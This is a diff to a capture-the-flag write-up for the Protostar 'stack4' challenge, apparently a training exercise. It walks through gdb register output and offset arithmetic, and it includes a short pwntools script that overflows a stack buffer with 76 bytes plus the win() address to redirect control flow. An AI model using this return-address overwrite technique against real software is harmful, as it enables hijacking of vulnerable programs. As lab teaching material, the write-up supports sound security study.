@@ -28,8 +28,35 @@ Dump of assembler code for function win:
    0x08048406 <+18>:	leave
    0x08048407 <+19>:	ret
 End of assembler dump.
-## Method
 ```
-As we can see, the win function's memory location is 0x080483f4. So when we overflow the stack, the last bytes we want should be the value 0x080483f4 (reversed since little endian).
+As we can see, the win function's memory location is 0x080483f4. So when we overflow the stack, the last bytes we want should be the value 0x080483f4 (reversed since little endian). But to overflow the stack with surgical precision, we need the address of the variable to overwrite.
+
+If we set up a breakpoint in the main function after all the stack management is finished (0x08048411), we can find the new location of the base pointer with gdb's "info registers":
+```shell
+[...]
+$ebp   : 0xffffd1f8  →  0x00000000
+$esp   : 0xffffd1a0  →  0xf7ffcff4  →  0x00033f14
+[...]
+```
+Our entrypoint is located at esp+0x10 and our target is at ebp+0x04. We can use gdb to do some hex arithmetic for us:
+```shell
+p $ebp + 0x04 - $esp - 0x10
+0x4c
+```
+If the above is confusing, try to accept that the stack grows upside down in relation to the program memory. It's a difficult thing to accept. 
+0x4c is 76 in decimal, which means we'll have to compose a string that's 76 + 4 characters long, and the last characters will need to be
+0x080483f4 (reversed because little endian). Let's get cracking!
 
 ## Method
+Much like [stack3](https://github.com/aldamd/CTF/tree/main/writeups/protostar/stack3), we're cooking this up with pwntools because I'm tired of being misunderstood by UTF-8.
+```python3
+from pwn import process
+p = process("./stack4")
+p.sendline(b"A"*76 + b"\xf4\x83\x04\x08")
+p.interactive()
+
+>>
+code flow successfully changed
+```
+
+Easy as that!
